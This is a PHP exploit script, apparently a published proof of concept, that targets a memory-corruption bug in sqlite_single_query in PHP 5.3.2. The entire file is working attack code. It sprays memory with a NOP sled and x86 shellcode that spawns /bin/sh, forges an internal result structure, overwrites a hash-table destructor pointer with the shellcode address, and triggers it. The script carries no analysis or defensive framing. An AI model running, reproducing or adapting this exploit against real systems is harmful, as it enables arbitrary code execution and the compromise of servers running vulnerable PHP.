<?php

/* sqlite_single_query exploit for php-5.3.2
 * discovered and exploited   by  digitalsun
 *
 * e-mail  : ds@digitalsun.pl
 * website : http://www.digitalsun.pl/
 */

/* DEFINE */

define('EVIL_SPACE_ADDR', 0xb6f00000);
define('EVIL_SPACE_SIZE', 1024*1024);

$SHELLCODE =
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

/* Initialize */
$sqh = sqlite_popen("/tmp/whatever");

/* allocate memory for evil table */
$EVIL_TABLE = str_repeat("\x31\x00\x00\x00", EVIL_SPACE_SIZE);
/* allocate memory for shellcode  */
$CODE = str_repeat("\x90\x90\x90\x90", EVIL_SPACE_SIZE);

for ( $i = 0, $j = EVIL_SPACE_SIZE*4 - strlen($SHELLCODE) - 1 ;
        $i < strlen($SHELLCODE) ; $i++, $j++ ) {
    $CODE[$j] = $SHELLCODE[$i];
}

$rres =
/* struct php_sqlite_result {        */
/*         struct php_sqlite_db *db; */ "AAAA" .
/*         sqlite_vm *vm;            */ "\x00\x00\x00\x00"         .
/*         int buffered;             */ "\x00\x00\x00\x00"         .
/*         int ncolumns;             */ "\x00\x00\x00\x00"         .
/*         int nrows;                */ "\x00\x00\x00\x00"         .
/*         int curr_row;             */ "\x00\x00\x00\x00"         .
/*         char **col_names;         */ pack('L', EVIL_SPACE_ADDR) .
/*         int alloc_rows;           */ "\x00\x00\x00\x00"         .
/*         int mode;                 */ "\x00\x00\x00\x00"         .
/*         char **table;             */ "\x00\x00\x00"             ; // + one byte for \x00
/* };*/

str_repeat($rres,1);
$dummy = sqlite_single_query($sqh," ");

/* get hash table */
$array = array(array());

/* find hash table */

$hash_table_offset = NULL;

for ( $i = 0 ; $i < strlen($EVIL_TABLE) ; $i+=4 )
{
    if ( $EVIL_TABLE[$i] != "\x31" ) {
        $hash_table_offset = $i;
        break;
    }
}

if ( is_null($hash_table_offset) )
    die("[-] Couldn't find hash table, exiting.");
else
{
    printf("[+] hashtable found @ 0x%08x\n", $hash_table_offset);
}

/* change the destructor */
$shellcode_addr = EVIL_SPACE_ADDR-EVIL_SPACE_SIZE*4-$hash_table_offset;
printf("[+] guessed shellcode address: 0x%08x\n", $shellcode_addr);
$shellcode_addr = pack('L', $shellcode_addr);

$EVIL_TABLE[$hash_table_offset+8*4+3] = $shellcode_addr[3];
$EVIL_TABLE[$hash_table_offset+8*4+2] = $shellcode_addr[2];
$EVIL_TABLE[$hash_table_offset+8*4+1] = $shellcode_addr[1];
$EVIL_TABLE[$hash_table_offset+8*4+0] = $shellcode_addr[0];

printf("[+] jumping to the shellcode\n");
/* trigger the destructor */
unset($array);


die('[-] failed ;[');
?>
